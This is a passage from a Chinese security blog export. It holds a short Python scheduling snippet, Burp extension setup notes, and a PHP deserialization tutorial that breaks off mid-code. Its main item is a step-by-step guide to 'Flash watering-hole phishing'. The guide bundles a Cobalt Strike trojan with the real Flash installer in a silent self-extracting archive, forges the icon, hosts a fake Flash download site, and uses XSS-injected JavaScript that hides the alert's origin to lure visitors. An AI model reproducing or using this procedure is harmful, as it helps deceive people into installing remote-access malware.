class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> schedule,time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job1</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'任务1接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job2</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'任务2接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job3</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">'任务3接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ensure_schedule_1</span><span class="params">()</span>:</span></span><br><span class="line">    threading.Thread(target=job1,args=(<span class="number">1</span>,)).start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ensure_schedule_2</span><span class="params">()</span>:</span></span><br><span class="line">    threading.Thread(target=job2,args=(<span class="number">2</span>,)).start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ensure_schedule_3</span><span class="params">()</span>:</span></span><br><span class="line">    threading.Thread(target=job3,args=(<span class="number">3</span>,)).start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    schedule.every(<span class="number">1</span>).seconds.do(ensure_schedule_1)</span><br><span class="line">    schedule.every(<span class="number">1</span>).seconds.do(ensure_schedule_2)</span><br><span class="line">    schedule.every(<span class="number">1</span>).seconds.do(ensure_schedule_3)</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        schedule.run_pending()</span><br><span class="line">run()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Flash水坑钓鱼</title>
      <link href="/2020/02/06/Flash%E6%B0%B4%E5%9D%91%E9%92%93%E9%B1%BC/"/>
      <url>/2020/02/06/Flash%E6%B0%B4%E5%9D%91%E9%92%93%E9%B1%BC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="Flash水坑钓鱼"><a href="#Flash水坑钓鱼" class="headerlink" title="Flash水坑钓鱼"></a>Flash水坑钓鱼</h3><ul><li><ul><li><a href="#_2">起因</a></li><li><a href="#_7">准备</a></li><li><a href="#_12">先配置一个马子吧</a></li><li><a href="#_19">自解压捆绑文件的利用</a></li><li><ul><li><a href="#_81">上传到服务器</a></li></ul></li><li><a href="#_92">常见用法</a></li></ul></li></ul><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在网络上看到许多大佬都拿这个钓鱼，而且感觉成功率贼高。<br>未雨绸缪，先测试一下，以后肯定用的到</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>flash官网的钓鱼源码：<a href="https://github.com/r00tSe7en/Fake-flash.cn" target="_blank" rel="noopener">https://github.com/r00tSe7en/Fake-flash.cn</a><br>一个服务器<br>一个域名<br>一个马子</p><h2 id="先配置一个马子吧"><a href="#先配置一个马子吧" class="headerlink" title="先配置一个马子吧"></a>先配置一个马子吧</h2><ul><li>使用常用的CS吧，随便来一个，成功上线<br><img src="https://img-blog.csdnimg.cn/202002061054387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>关于免杀，暂时就不了(因为菜)</li><li>推荐使用一个好的隐藏方式</li></ul><h2 id="自解压捆绑文件的利用"><a href="#自解压捆绑文件的利用" class="headerlink" title="自解压捆绑文件的利用"></a>自解压捆绑文件的利用</h2><p>捆版木马时碰到一个问题大多捆绑软件本身就会被杀软查杀，所以选择利用winrar实现捆绑。</p><ol><li><p>准备好的木马和flash安装程序</p></li><li><p>鼠标右键，添加到压缩文件。</p></li></ol><p><code>点击创建自解压格式压缩文件</code><br><img src="https://img-blog.csdnimg.cn/20200206110906864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4. 点击高级自解压选项——————-常规<br><img src="https://img-blog.csdnimg.cn/20200206111046921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用绝对路径 -------------- C:\windows\temp</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200206111221661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="4"><li>设置———提取后运行</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\windows\temp\flash.exe</span><br><span class="line"></span><br><span class="line">C:\windows\temp\flashplayer_install_cn.exe</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200206111434557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="5"><li>安静模式———全部隐藏</li></ol><p><img src="https://img-blog.csdnimg.cn/2020020611150857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="6"><li>更新</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">更新方式----解压并更新文件</span><br><span class="line"></span><br><span class="line">覆盖方式----覆盖所有文件</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200206111745780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="7"><li>确定，出去把文件名改的像一点<br><img src="https://img-blog.csdnimg.cn/20200206114209174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>这图标也不像啊，得改<br><img src="https://img-blog.csdnimg.cn/2020020611432490.png" alt="在这里插入图片描述"></li><li>使用 ResourceHacker 把图标改了，自行下载</li><li>通过ResourceHacker打开原版的flash安装程序，点击Icon Group文件夹中的文件，鼠标右键保存“*.ico资源”，即可导出ico图标。<br><img src="https://img-blog.csdnimg.cn/20200206115037810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>同样的方法—-ResourceHacker打开刚刚打包好的文件，点击Icon Group文件夹中的文件，鼠标右键替换ico图标，最后保存</li></ol><p><img src="https://img-blog.csdnimg.cn/20200206115439272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200206115637855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后保存成功，图标搞定<img src="https://img-blog.csdnimg.cn/2020020611570775.png" alt="图标搞定"></p><ul><li>捆绑木马就做好了。下面是运行截图，伪装的完美，全程无感知，就是没有做木马的免杀如果有杀毒软件会报毒。</li><li><img src="https://img-blog.csdnimg.cn/20200206115918874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>也能上线<img src="https://img-blog.csdnimg.cn/20200206120000983.png" alt="在这里插入图片描述"></li><li>马子完成了。</li></ul><h3 id="上传到服务器"><a href="#上传到服务器" class="headerlink" title="上传到服务器"></a>上传到服务器</h3><p>跟前情况自己开服务，我就直接装了了一个Apache<br><img src="https://img-blog.csdnimg.cn/20200206152501383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改fake网站的源码，把链接加进去。</p><p><img src="https://img-blog.csdnimg.cn/20200206153316957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传到服务器看效果</p><p><img src="https://img-blog.csdnimg.cn/20200206155353255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还可以，就是域名方面需要进一步的伪造，要买一个不错的域名更佳</p><h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><p>直接给地址让下载这个可能性太低了，感觉还是需要XSS打进去，弹框提示上钩的几率最大，这也大家常用的方法之一。<br>但是有个问题不能让看出是弹窗，最后是可以隐藏掉网站显示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//重写alert方法，去掉地址显示</span></span><br><span class="line">window.alert = function(name)&#123;</span><br><span class="line"><span class="keyword">var</span> iframe = document.createElement(<span class="string">"IFRAME"</span>);</span><br><span class="line">iframe.style.display=<span class="string">"none"</span>;</span><br><span class="line">iframe.setAttribute(<span class="string">"src"</span>, <span class="string">'data:text/plain,'</span>);</span><br><span class="line">document.documentElement.appendChild(iframe);</span><br><span class="line">window.frames[<span class="number">0</span>].window.alert(name);</span><br><span class="line">iframe.parentNode.removeChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重写confirm方法，去掉地址显示</span></span><br><span class="line">window.confirm = function(name)&#123;</span><br><span class="line"><span class="keyword">var</span> iframe = document.createElement(<span class="string">"IFRAME"</span>);</span><br><span class="line">iframe.style.display=<span class="string">"none"</span>;</span><br><span class="line">iframe.setAttribute(<span class="string">"src"</span>, <span class="string">'data:text/plain,'</span>);</span><br><span class="line">document.documentElement.appendChild(iframe);</span><br><span class="line"><span class="keyword">var</span> result = window.frames[<span class="number">0</span>].window.confirm(name);</span><br><span class="line">iframe.parentNode.removeChild(iframe);</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200206162156507.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.alert = function(name)&#123;<span class="keyword">var</span> iframe = document.createElement(<span class="string">"IFRAME"</span>);iframe.style.display=<span class="string">"none"</span>;iframe.setAttribute(<span class="string">"src"</span>, <span class="string">'data:text/plain,'</span>);document.documentElement.appendChild(iframe);window.frames[<span class="number">0</span>].window.alert(name);iframe.parentNode.removeChild(iframe);&#125;;alert(<span class="string">"您的FLASH版本过低，请尝试升级后访问改页面!"</span>);window.location.href=<span class="string">"https://www.baidu.com"</span>;</span><br></pre></td></tr></table></figure><p>可以直接在XSS平台里面建一个模块，然后xss打出去，要不太长了代码</p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>IPRotate_Burp_Extension安装</title>
      <link href="/2020/01/17/IPRotate_Burp_Extension%E5%AE%89%E8%A3%85/"/>
      <url>/2020/01/17/IPRotate_Burp_Extension%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>IPRotate_Burp_Extension安装</p><ol><li>在BurpSuite中安装Jython环境</li></ol><p><a href="https://blog.csdn.net/god\_zzZ/article/details/104019232" target="_blank" rel="noopener">https://blog.csdn.net/god\_zzZ/article/details/104019232</a></p><ol start="2"><li>为Python 安装boto3模块。<br>pip install boto3</li><li>导入python文件</li></ol><p><img src="https://img-blog.csdnimg.cn/20200117145551414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>在BurpSuite中安装Jython环境</title>
      <link href="/2020/01/17/%E5%9C%A8BurpSuite%E4%B8%AD%E5%AE%89%E8%A3%85Jython%E7%8E%AF%E5%A2%83/"/>
      <url>/2020/01/17/%E5%9C%A8BurpSuite%E4%B8%AD%E5%AE%89%E8%A3%85Jython%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="在BurpSuite中安装Jython环境"><a href="#在BurpSuite中安装Jython环境" class="headerlink" title="在BurpSuite中安装Jython环境"></a>在BurpSuite中安装Jython环境</h2><ol><li>下载模块</li></ol><p>下载地址<br><a href="https://www.jython.org/download.html" target="_blank" rel="noopener">https://www.jython.org/download.html</a><br>下载 Jython <strong>Standalone</strong>版本的<br><img src="https://img-blog.csdnimg.cn/2020011714461488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="2"><li>打开burp</li></ol><p><img src="https://img-blog.csdnimg.cn/2020011714475897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第一个框子是刚刚下载jar包<br>第二个时候python的模块文件地址 要到 lib\site-packages里面</p><ol start="4"><li>成功</li></ol>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化漏洞解析和研究</title>
      <link href="/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/"/>
      <url>/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="php反序列化漏洞解析和研究"><a href="#php反序列化漏洞解析和研究" class="headerlink" title="php反序列化漏洞解析和研究"></a>php反序列化漏洞解析和研究</h3><ul><li><a href="#PHP_2">PHP序列化是什么</a></li><li><ul><li><a href="#_17">铺垫知识</a></li><li><ul><li><a href="#_18">示例序列化</a></li><li><a href="#_62">反序列实例</a></li></ul></li></ul></li><li><a href="#_73">魔术方法</a></li><li><ul><li><a href="#_113">比较重要的方法</a></li></ul></li><li><a href="#_204">反序列化对象注入</a></li><li><ul><li><a href="#__wakeup_206">绕过__wakeup()方法</a></li></ul></li><li><a href="#POP_240">POP链构造</a></li><li><ul><li><a href="#POP_242">POP：面向属性编程</a></li><li><a href="#_246">基本概念</a></li><li><a href="#POP_251">POP链利用</a></li><li><a href="#_255">训练</a></li></ul></li></ul><h1 id="PHP序列化是什么"><a href="#PHP序列化是什么" class="headerlink" title="PHP序列化是什么"></a>PHP序列化是什么</h1><blockquote><p>serialize() //将一个对象转换成一个字符串<br>unserialize() //将字符串还原成一个对象</p></blockquote><p>序列化：将php值转换为可存储或传输的字符串，目的是防止丢失其结构和数据类型。</p><p>反序列化：序列化的逆过程，将字符串再转化成原来的php变量，以便于使用。</p><p>简单来说，就是涉及php中的serialize与unserialize两个函数。</p><p>通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。</p><h2 id="铺垫知识"><a href="#铺垫知识" class="headerlink" title="铺垫知识"></a>铺垫知识</h2><h3 id="示例序列化"><a href="#示例序列化" class="headerlink" title="示例序列化"></a>示例序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">testclass</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $flag = <span class="string">"flag&#123;233&#125;"</span>;</span><br><span class="line">        <span class="keyword">public</span> $name = <span class="string">"baba"</span>;</span><br><span class="line">        <span class="keyword">public</span> $age = <span class="string">"18"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">Info</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'输出'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' '</span>.<span class="keyword">$this</span>-&gt;age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $test = <span class="keyword">new</span> testclass();</span><br><span class="line">    $test-&gt;name = <span class="string">'zhaibaba'</span>;</span><br><span class="line">    $test -&gt;age =<span class="string">'18'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $test-&gt;Info();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    $data = serialize($test);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"序列化\n"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $data;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure><p>输出<br>输出zhaibaba 18</p><p>序列化<br>O:9:“testclass”:3:{s:15:” testclass flag”;s:9:“flag{233}”;s:4:“name”;s:8:“zhaibaba”;s:3:“age”;s:2:“18”;}</p><p><code>O:9:&quot;testclass&quot;</code> 代表Object(对象) 9个字符:testclass<br><code>:3</code>对象属性个数为3<br><code>{}</code>中为属性字符数：属性值<br><code>s:15:&quot; testclass flag&quot;</code> 为 string类型 private私有属性 会加类名 public 共有的 直接属性名</p><blockquote><p>public权限就是正常的变量权限，一般声明的变量权限均为public<br>protected权限是私有权限，即只能在类内使用，子类可以继承这个变量<br>private权限也是私有权限，比protected权限更似有一些，只能在本类内使用，子类不能继承</p></blockquote><h3 id="反序列实例"><a href="#反序列实例" class="headerlink" title="反序列实例"></a>反序列实例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$un = unserialize($data);</span><br><span class="line">   <span class="comment"># $un = unserialize('O:9:"testclass":2:&#123;s:4:"name";s:8:"zhaibaba";s:3:"age";s:2:"18";&#125;');</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"反序列化\n"</span>;</span><br><span class="line">   var_dump($un);</span><br></pre></td></tr></table></figure><p>反序列化为一个对象了<br><img src="https://img-blog.csdnimg.cn/20200103114111631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><blockquote><p>魔术方法：在php中以两个下划线字符（__）开头的方法，方法名都是PHP预先定义好的，之所以称为魔术方法<br>就是这些方法不需要显示的调用而是由某种特定的条件触发执行。</p></blockquote><p>在利用对PHP反序列化进行利用时，经常需要通过反序列化中的魔术方法，检查方法里有无敏感操作来进行利用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">常见方法</span><br><span class="line">__constuct: 构建对象的时被调用</span><br><span class="line"></span><br><span class="line">__destruct: 明确销毁对象或脚本结束时被调用</span><br><span class="line"></span><br><span class="line">__wakeup: 当使用unserialize时被调用，可用于做些对象的初始化操作</span><br><span class="line"></span><br><span class="line">__sleep: 当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用</span><br><span class="line"></span><br><span class="line">__call: 调用不可访问或不存在的方法时被调用</span><br><span class="line"></span><br><span class="line">__callStatic: 调用不可访问或不存在的静态方法时被调用</span><br><span class="line"></span><br><span class="line">__set: 当给不可访问或不存在属性赋值时被调用</span><br><span class="line"></span><br><span class="line">__get: 读取不可访问或不存在属性时被调用</span><br><span class="line"></span><br><span class="line">__isset: 对不可访问或不存在的属性调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()时被调用</span><br><span class="line"></span><br><span class="line">__unset: 对不可访问或不存在的属性进行<span class="keyword">unset</span>时被调用</span><br><span class="line"></span><br><span class="line">__invoke: 当以函数方式调用对象时被调用</span><br><span class="line"></span><br><span class="line">__toString: 当一个类被转换成字符串时被调用</span><br><span class="line"></span><br><span class="line">__clone: 进行对象<span class="keyword">clone</span>时被调用，用来调整对象的克隆行为</span><br><span class="line"></span><br><span class="line">__debuginfo: 当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5<span class="number">.6</span>版本</span><br><span class="line"></span><br><span class="line">__set_state: 当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值</span><br></pre></td></tr></table></figure><h2 id="比较重要的方法"><a href="#比较重要的方法" class="headerlink" title="比较重要的方法"></a>比较重要的方法</h2><p><strong>__sleep()</strong></p><blockquote><p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p></blockquote><p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p><p>__wakeup()</p><blockquote><p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup<br>方法，预先准备对象需要的资源。</p></blockquote><p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ID, $sex, $age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ID = $ID;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;info . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * serialize前调用 用于删选需要被序列化存储的成员变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">'ID'</span>, <span class="string">'sex'</span>, <span class="string">'age'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * unserialize前调用 用于预先准备对象资源</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me = <span class="keyword">new</span> Caiji(<span class="string">'twosmi1e'</span>, <span class="number">20</span>, <span class="string">'male'</span>);</span><br><span class="line"></span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line"><span class="comment">//存在__sleep(函数，$info属性不会被存储</span></span><br><span class="line">$temp = serialize($me);</span><br><span class="line"><span 